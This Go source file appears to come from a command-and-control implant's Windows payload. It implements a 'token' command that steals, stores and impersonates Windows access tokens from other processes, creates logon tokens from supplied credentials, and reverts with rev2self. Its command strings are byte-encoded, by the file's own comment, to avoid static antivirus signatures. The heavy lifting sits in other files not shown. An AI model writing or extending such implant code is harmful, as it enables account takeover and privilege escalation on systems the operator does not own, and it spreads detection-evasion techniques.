// server/docker/payloads/Windows/action_token_windows.go
//go:build windows
// +build windows

package main

import (
	"strconv"
	"strings"
	"time"
)

// Token command strings (constructed to avoid static signatures)
var (
	// Command name
	tokCmdName = string([]byte{0x74, 0x6f, 0x6b, 0x65, 0x6e}) // token

	// Verbs
	tokVerbCreate      = string([]byte{0x63, 0x72, 0x65, 0x61, 0x74, 0x65})                                     // create
	tokVerbSteal       = string([]byte{0x73, 0x74, 0x65, 0x61, 0x6c})                                           // steal
	tokVerbStore       = string([]byte{0x73, 0x74, 0x6f, 0x72, 0x65})                                           // store
	tokVerbUse         = string([]byte{0x75, 0x73, 0x65})                                                       // use
	tokVerbImpersonate = string([]byte{0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x65})       // impersonate
	tokVerbNetonly     = string([]byte{0x6e, 0x65, 0x74, 0x6f, 0x6e, 0x6c, 0x79})                               // netonly
	tokVerbList        = string([]byte{0x6c, 0x69, 0x73, 0x74})                                                 // list
	tokVerbStored      = string([]byte{0x73, 0x74, 0x6f, 0x72, 0x65, 0x64})                                     // stored
	tokVerbCurrent     = string([]byte{0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74})                               // current
	tokVerbStatus      = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                     // status
	tokVerbRemove      = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})                                     // remove
	tokVerbClear       = string([]byte{0x63, 0x6c, 0x65, 0x61, 0x72})                                           // clear
	tokVerbRevert      = string([]byte{0x72, 0x65, 0x76, 0x65, 0x72, 0x74})                                     // revert
	tokVerbRev2self    = string([]byte{0x72, 0x65, 0x76, 0x32, 0x73, 0x65, 0x6c, 0x66})                         // rev2self

	// Subcommand actions
	tokActSet        = string([]byte{0x73, 0x65, 0x74})                                                         // set
	tokActProcesses  = string([]byte{0x70, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x65, 0x73})                     // processes

	// Default values
	tokDefInteractive = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})       // interactive
)

// TokenCommand consolidates all token management functionality
type TokenCommand struct{}

func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	verb := strings.ToLower(args[0])
	verbArgs := args[1:]

	switch verb {
	// === Token Creation ===
	case tokVerbCreate:
		return c.handleCreate(ctx, verbArgs)

	// === Token Stealing ===
	case tokVerbSteal:
		return c.handleSteal(ctx, verbArgs)
	case tokVerbStore:
		return c.handleStore(ctx, verbArgs)

	// === Token Usage ===
	case tokVerbUse:
		return c.handleUse(ctx, verbArgs)
	case tokVerbImpersonate:
		return c.handleImpersonate(ctx)

	// === Network-Only Management ===
	case tokVerbNetonly:
		return c.handleNetOnly(ctx, verbArgs)

	// === Token Listing/Info ===
	case tokVerbList:
		return c.handleList(ctx, verbArgs)
	case tokVerbStored:
		return c.handleStored(ctx)
	case tokVerbCurrent, tokVerbStatus:
		return c.handleCurrent(ctx)

	// === Token Cleanup ===
	case tokVerbRemove:
		return c.handleRemove(ctx, verbArgs)
	case tokVerbClear:
		return c.handleClear(ctx)
	case tokVerbRevert, tokVerbRev2self:
		// Allow both for compatibility
		return c.handleRevert(ctx)

	default:
		return CommandResult{
			Output:      ErrCtx(E2, verb),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Creation (from make-token)
// ============================================================================

func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandResult {
	// Delegate to existing MakeTokenCommand logic
	makeToken := &MakeTokenCommand{}

	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle 'token create netonly' specially
	if args[0] == tokVerbNetonly {
		if len(args) < 4 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return makeToken.createNetOnlyToken(ctx, args[1], args[2], args[3])
	}

	// Regular token creation
	if len(args) < 3 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	userpass := args[0]
	password := args[1]
	tokenName := args[2]
	logonType := tokDefInteractive
	if len(args) > 3 {
		logonType = args[3]
	}

	return makeToken.createToken(ctx, userpass, password, tokenName, logonType)
}

// ============================================================================
// Token Stealing (from steal-token)
// ============================================================================

func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E2, args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	name := ""
	netOnly := false

	// Parse additional arguments for name and netonly flag
	for i := 1; i < len(args); i++ {
		if strings.ToLower(args[i]) == tokVerbNetonly {
			netOnly = true
		} else if name == "" {
			name = args[i]
		}
	}

	return stealToken.stealAndImpersonate(ctx, pid, name, netOnly)
}

func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E2, args[0]),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 2 && strings.ToLower(args[2]) == tokVerbNetonly {
		netOnly = true
	}

	return stealToken.storeToken(ctx, pid, args[1], netOnly)
}

// ============================================================================
// Token Usage
// ============================================================================

func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 1 && strings.ToLower(args[1]) == tokVerbNetonly {
		netOnly = true
	}

	return stealToken.useStoredToken(ctx, args[0], netOnly)
}

func (c *TokenCommand) handleImpersonate(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.impersonateToken(ctx)
}

// ============================================================================
// Network-Only Management
// ============================================================================

func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) == 0 {
		return stealToken.showNetOnlyStatus()
	}

	action := strings.ToLower(args[0])
	switch action {
	case tokActSet:
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		return stealToken.setNetOnlyToken(ctx, args[1])

	case tokVerbClear:
		return stealToken.clearNetOnlyToken(ctx)

	case tokVerbStatus:
		return stealToken.showNetOnlyStatus()

	default:
		return CommandResult{
			Output:      ErrCtx(E2, action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Listing/Info
// ============================================================================

func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandResult {
	// Check if they want to list processes (token list processes)
	if len(args) > 0 && args[0] == tokActProcesses {
		stealToken := &StealTokenCommand{}
		return stealToken.listTokens()
	}

	// Otherwise show stored tokens
	return c.handleStored(ctx)
}

func (c *TokenCommand) handleStored(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.listStoredTokens()
}

func (c *TokenCommand) handleCurrent(ctx *CommandContext) CommandResult {
	stealToken := &StealTokenCommand{}
	return stealToken.getCurrentTokenInfo()
}

// ============================================================================
// Token Cleanup
// ============================================================================

func (c *TokenCommand) handleRemove(ctx *CommandContext, args []string) CommandResult {
	stealToken := &StealTokenCommand{}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return stealToken.removeStoredToken(ctx, args[0])
}

func (c *TokenCommand) handleClear(ctx *CommandContext) CommandResult {
	makeToken := &MakeTokenCommand{}
	return makeToken.clearTokens(ctx)
}

func (c *TokenCommand) handleRevert(ctx *CommandContext) CommandResult {
	rev2self := &Rev2SelfCommand{}
	return rev2self.Execute(ctx, []string{})
}
